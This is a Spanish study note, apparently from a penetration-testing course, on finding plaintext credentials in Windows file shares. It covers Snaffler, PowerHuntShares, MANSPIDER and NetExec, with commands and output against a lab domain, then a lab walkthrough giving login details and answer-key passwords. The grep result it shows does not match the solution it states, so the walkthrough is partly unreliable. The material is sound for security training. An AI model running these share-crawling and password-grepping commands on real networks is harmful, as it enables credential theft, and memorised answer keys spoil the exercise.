Casi todos los entornos corporativos incluyen recursos compartidos de red que los empleados utilizan para almacenar y compartir archivos entre equipos. Si bien estas carpetas compartidas son esenciales, pueden convertirse involuntariamente en una mina de oro para los atacantes, especialmente cuando se olvidan datos confidenciales como credenciales de texto plano o archivos de configuración. En esta sección, exploraremos cómo buscar credenciales en recursos compartidos de red de sistemas Windows y Linux mediante herramientas comunes, junto con técnicas generales que los atacantes utilizan para descubrir secretos ocultos.

---
## Patrones comunes para la búsqueda de credenciales en archivos compartidos

Objetivo: localizar credenciales dentro de un entorno/compartición buscando palabras clave y ficheros probables.

Palabras clave sugeridas: passw, user, token, key, secret (y variantes locales: p. ej. Benutzer en alemán).

Extensiones útiles a inspeccionar: .ini, .cfg, .env, .xlsx, .ps1, .bat (archivos donde suelen quedar credenciales).

Nombres de fichero “interesantes”: contener config, user, passw, cred, initial, etc.

Búsque da específica en dominios: buscar cadenas con el prefijo del dominio (p. ej. INLANEFREIGHT\) para encontrar referencias a cuentas del dominio.

Estrategia: priorizar recursos compartidos con más probabilidad de contener credenciales (p. ej. shares de TI) —no recorrer ciegamente miles de archivos—; adaptar palabras clave al contexto y lengua del objetivo.

Procedimiento recomendado (alto nivel): empezar con búsquedas básicas por línea de comandos (ej. Get-ChildItem / Select-String en Windows) y, si procede y se tiene autorización, pasar a herramientas automatizadas más avanzadas (MANSPIDER, Snaffler, SnafflePy, NetExec).

Nota legal/ética: realizar solo con autorización explícita — buscar credenciales sin permiso es ilegal y poco ético.

---

## Búsqueda por windows

### SNAFFLER
La primera herramienta que abordaremos es Snaffler. Se trata de un programa de C# que, al ejecutarse en una máquina unida a un dominio, identifica automáticamente los recursos compartidos de red accesibles y busca archivos interesantes. El archivo README del repositorio de Github describe las numerosas opciones de configuración con gran detalle; sin embargo, se puede realizar una búsqueda básica de la siguiente manera:

```cmd-session
c:\Users\Public>Snaffler.exe -s

 .::::::.:::.    :::.  :::.    .-:::::'.-:::::':::    .,:::::: :::::::..
;;;`    ``;;;;,  `;;;  ;;`;;   ;;;'''' ;;;'''' ;;;    ;;;;'''' ;;;;``;;;;
'[==/[[[[, [[[[[. '[[ ,[[ '[[, [[[,,== [[[,,== [[[     [[cccc   [[[,/[[['
  '''    $ $$$ 'Y$c$$c$$$cc$$$c`$$$'`` `$$$'`` $$'     $$""   $$$$$$c
 88b    dP 888    Y88 888   888,888     888   o88oo,.__888oo,__ 888b '88bo,
  'YMmMY'  MMM     YM YMM   ''` 'MM,    'MM,  ''''YUMMM''''YUMMMMMMM   'W'
                         by l0ss and Sh3r4 - github.com/SnaffCon/Snaffler


[INLANEFREIGHT\jbader@DC01] 2025-05-01 17:41:42Z [Info] Parsing args...
[INLANEFREIGHT\jbader@DC01] 2025-05-01 17:41:43Z [Info] Parsed args successfully.
[INLANEFREIGHT\jbader@DC01] 2025-05-01 17:41:43Z [Info] Invoking DFS Discovery because no ComputerTargets or PathTargets were specified
[INLANEFREIGHT\jbader@DC01] 2025-05-01 17:41:43Z [Info] Getting DFS paths from AD.
[INLANEFREIGHT\jbader@DC01] 2025-05-01 17:41:43Z [Info] Found 0 DFS Shares in 0 namespaces.
[INLANEFREIGHT\jbader@DC01] 2025-05-01 17:41:43Z [Info] Invoking full domain computer discovery.
[INLANEFREIGHT\jbader@DC01] 2025-05-01 17:41:43Z [Info] Getting computers from AD.
[INLANEFREIGHT\jbader@DC01] 2025-05-01 17:41:43Z [Info] Got 1 computers from AD.
[INLANEFREIGHT\jbader@DC01] 2025-05-01 17:41:43Z [Info] Starting to look for readable shares...
[INLANEFREIGHT\jbader@DC01] 2025-05-01 17:41:43Z [Info] Created all sharefinder tasks.
[INLANEFREIGHT\jbader@DC01] 2025-05-01 17:41:43Z [Share] {Black}<\\DC01.inlanefreight.local\ADMIN$>()
[INLANEFREIGHT\jbader@DC01] 2025-05-01 17:41:43Z [Share] {Green}<\\DC01.inlanefreight.local\ADMIN$>(R) Remote Admin
[INLANEFREIGHT\jbader@DC01] 2025-05-01 17:41:43Z [Share] {Black}<\\DC01.inlanefreight.local\C$>()
[INLANEFREIGHT\jbader@DC01] 2025-05-01 17:41:43Z [Share] {Green}<\\DC01.inlanefreight.local\C$>(R) Default share
[INLANEFREIGHT\jbader@DC01] 2025-05-01 17:41:43Z [Share] {Green}<\\DC01.inlanefreight.local\Company>(R)
[INLANEFREIGHT\jbader@DC01] 2025-05-01 17:41:43Z [Share] {Green}<\\DC01.inlanefreight.local\Finance>(R)
[INLANEFREIGHT\jbader@DC01] 2025-05-01 17:41:43Z [Share] {Green}<\\DC01.inlanefreight.local\HR>(R)
[INLANEFREIGHT\jbader@DC01] 2025-05-01 17:41:43Z [Share] {Green}<\\DC01.inlanefreight.local\IT>(R)
[INLANEFREIGHT\jbader@DC01] 2025-05-01 17:41:43Z [Share] {Green}<\\DC01.inlanefreight.local\Marketing>(R)
[INLANEFREIGHT\jbader@DC01] 2025-05-01 17:41:43Z [Share] {Green}<\\DC01.inlanefreight.local\NETLOGON>(R) Logon server share
[INLANEFREIGHT\jbader@DC01] 2025-05-01 17:41:43Z [Share] {Green}<\\DC01.inlanefreight.local\Sales>(R)
[INLANEFREIGHT\jbader@DC01] 2025-05-01 17:41:43Z [Share] {Green}<\\DC01.inlanefreight.local\SYSVOL>(R) Logon server share
[INLANEFREIGHT\jbader@DC01] 2025-05-01 17:41:51Z [File] {Red}<KeepPassOrKeyInCode|R|passw?o?r?d?>\s*[^\s<]+\s*<|2.3kB|2025-05-01 05:22:48Z>(\\DC01.inlanefreight.local\ADMIN$\Panther\unattend.xml) 5"\ language="neutral"\ versionScope="nonSxS"\ xmlns:wcm="http://schemas\.microsoft\.com/WMIConfig/2002/State"\ xmlns:xsi="http://www\.w3\.org/2001/XMLSchema-instance">\n\t\t\ \ <UserAccounts>\n\t\t\ \ \ \ <AdministratorPassword>\*SENSITIVE\*DATA\*DELETED\*</AdministratorPassword>\n\ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ </UserAccounts>\n\ \ \ \ \ \ \ \ \ \ \ \ <OOBE>\n\ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ <HideEULAPage>true</HideEULAPage>\n\ \ \ \ \ \ \ \ \ \ \ \ </OOBE>\n\ \ \ \ \ \ \ \ </component
[INLANEFREIGHT\jbader@DC01] 2025-05-01 17:41:53Z [File] {Yellow}<KeepDeployImageByExtension|R|^\.wim$|29.2MB|2022-02-25 16:36:53Z>(\\DC01.inlanefreight.local\ADMIN$\Containers\serviced\WindowsDefenderApplicationGuard.wim) .wim
[INLANEFREIGHT\jbader@DC01] 2025-05-01 17:41:58Z [File] {Red}<KeepPassOrKeyInCode|R|passw?o?r?d?>\s*[^\s<]+\s*<|2.3kB|2025-05-01 05:22:48Z>(\\DC01.inlanefreight.local\C$\Windows\Panther\unattend.xml) 5"\ language="neutral"\ versionScope="nonSxS"\ xmlns:wcm="http://schemas\.microsoft\.com/WMIConfig/2002/State"\ xmlns:xsi="http://www\.w3\.org/2001/XMLSchema-instance">\n\t\t\ \ <UserAccounts>\n\t\t\ \ \ \ <AdministratorPassword>\*SENSITIVE\*DATA\*DELETED\*</AdministratorPassword>\n\ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ </UserAccounts>\n\ \ \ \ \ \ \ \ \ \ \ \ <OOBE>\n\ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ <HideEULAPage>true</HideEULAPage>\n\ \ \ \ \ \ \ \ \ \ \ \ </OOBE>\n\ \ \ \ \ \ \ \ </component
<SNIP>
```

Todas las herramientas de esta sección generan una gran cantidad de información. Si bien facilitan la automatización, suele requerirse una revisión manual considerable, ya que muchas coincidencias pueden resultar en falsos positivos. Dos parámetros útiles que pueden ayudar a refinar el proceso de búsqueda de Snaffler son:
- -u recupera una lista de usuarios de Active Directory y busca referencias a ellos en los archivos.
- -i y -n permiten especificar qué recursos compartidos deben incluirse en la búsqueda.

---
#### PowerHuntShares
Otra herramienta que se puede utilizar es PowerHuntShares, un script de PowerShell que no necesita ejecutarse necesariamente en una máquina unida a un dominio. Una de sus funciones más útiles es que genera un informe HTML al finalizar, lo que proporciona una interfaz de usuario intuitiva para revisar los resultados.

Podemos ejecutar un escaneo básico usando PowerHuntShares de la siguiente manera:
```powershell-session
PS C:\Users\Public\PowerHuntShares> Invoke-HuntSMBShares -Threads 100 -OutputDirectory c:\Users\Public

 ===============================================================
 INVOKE-HUNTSMBSHARES
 ===============================================================
  This function automates the following tasks:

  o Determine current computer's domain
  o Enumerate domain computers
  o Check if computers respond to ping requests
  o Filter for computers that have TCP 445 open and accessible
  o Enumerate SMB shares
  o Enumerate SMB share permissions
  o Identify shares with potentially excessive privileges
  o Identify shares that provide read or write access
  o Identify shares thare are high risk
  o Identify common share owners, names, & directory listings
  o Generate last written & last accessed timelines
  o Generate html summary report and detailed csv files

  Note: This can take hours to run in large environments.
 ---------------------------------------------------------------
 |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
 ---------------------------------------------------------------
 SHARE DISCOVERY
 ---------------------------------------------------------------
 [*][05/01/2025 12:51] Scan Start
 [*][05/01/2025 12:51] Output Directory: c:\Users\Public\SmbShareHunt-05012025125123
 [*][05/01/2025 12:51] Successful connection to domain controller: DC01.inlanefreight.local
 [*][05/01/2025 12:51] Performing LDAP query for computers associated with the inlanefreight.local domain
 [*][05/01/2025 12:51] -  computers found
 [*][05/01/2025 12:51] - 0 subnets found
 [*][05/01/2025 12:51] Pinging  computers
 [*][05/01/2025 12:51] -  computers responded to ping requests.
 [*][05/01/2025 12:51] Checking if TCP Port 445 is open on  computers
 [*][05/01/2025 12:51] - 1 computers have TCP port 445 open.
 [*][05/01/2025 12:51] Getting a list of SMB shares from 1 computers
 [*][05/01/2025 12:51] - 11 SMB shares were found.
 [*][05/01/2025 12:51] Getting share permissions from 11 SMB shares
<SNIP>
```

---

## Búsqueda desde Linux
#### Manspider

 Si no tenemos acceso a un equipo unido al dominio, o simplemente preferimos buscar archivos de forma remota, herramientas como MANSPIDER nos permiten escanear recursos compartidos SMB desde Linux. 
 Es recomendable ejecutar MANSPIDER usando el contenedor Docker oficial para evitar problemas de dependencia. Al igual que las demás herramientas, MANSPIDER ofrece numerosos parámetros configurables para afinar la búsqueda. Un escaneo básico de archivos que contengan la cadena "passw" se puede ejecutar de la siguiente manera:
```shell-session
Polika4RM@htb[/htb]$ docker run --rm -v ./manspider:/root/.manspider blacklanternsecurity/manspider 10.129.234.121 -c 'passw' -u 'mendres' -p 'Inlanefreight2025!'

[+] MANSPIDER command executed: /usr/local/bin/manspider 10.129.234.121 -c passw -u mendres -p Inlanefreight2025!
[+] Skipping files larger than 10.00MB
[+] Using 5 threads
[+] Searching by file content: "passw"
[+] Matching files will be downloaded to /root/.manspider/loot
[+] 10.129.234.121: Successful login as "mendres"
[+] 10.129.234.121: Successful login as "mendres"
<SNIP>
```

#### NetExec
Además de sus muchos otros usos, NetExec también permite buscar en recursos compartidos de red mediante la opción --spider. Esta función se describe detalladamente en la wiki oficial. Se puede ejecutar un análisis básico de recursos compartidos de red en busca de archivos que contengan la cadena "passw" de la siguiente manera:
```shell-session
Polika4RM@htb[/htb]$ nxc smb 10.129.234.121 -u mendres -p 'Inlanefreight2025!' --spider IT --content --pattern "passw"

SMB         10.129.234.121  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:inlanefreight.local) (signing:True) (SMBv1:False)
SMB         10.129.234.121  445    DC01             [+] inlanefreight.local\mendres:Inlanefreight2025! 
SMB         10.129.234.121  445    DC01             [*] Started spidering
SMB         10.129.234.121  445    DC01             [*] Spidering .
<SNIP>
```

---
**Use the credentials mendres:Inlanefreight2025! to connect to the target either by RDP or WinRM, then use the tools and techniques taught in this section to answer the questions below. For your convenience, Snaffler and PowerHuntShares can be found in C:\Users\Public.*
Target(s): 10.129.234.173
RDP to 10.129.234.173 (ACADEMY-PWATTCK-NETDC01) with user "mendres" and password "Inlanefreight2025!"

**1. One of the shares mendres has access to contains valid credentials of another domain user. What is their password?**


Ejecuto desde la máquina Kali atacante:
```
nxc smb 10.129.234.173 -u mendres -p 'Inlanefreight2025!' -M spider_plus -o DOWNLOAD_FLAG=True
```

Conectará al host `10.129.234.173` vía SMB usando las credenciales `mendres:Inlanefreight2025!`, ejecutará el módulo `spider_plus` para **enumerar** las comparticiones/directorios/ficheros y, porque `DOWNLOAD_FLAG=True`, **descargará** (copiará) los ficheros que el módulo decida recoger.

Nos devuelve por salida que el contenido que guardará en:
```
[*]  OUTPUT_FOLDER: /tmp/nxc_hosted/nxc_spider_plus
```

Seguidamente, acudiremos a dicho directorio y realizaremos:
```
grep -ri "passw"
```

Al realizar sobre dicho directorio el comando anterior, buscará en texto plano la palabra "passw" dentro de los ficheros.

Encontramos como salida una ruta interesante llamada: 
```
HR/Public/Onboarding_Docs_485.docx:password=HRrocks2025!
```

Solución: ILovePower333###

**2. As this user, search through the additional shares they have access to and identify the password of a domain administrator. What is it?**

Solución: Str0ng_Adm1nistrat0r_P@ssword_2025!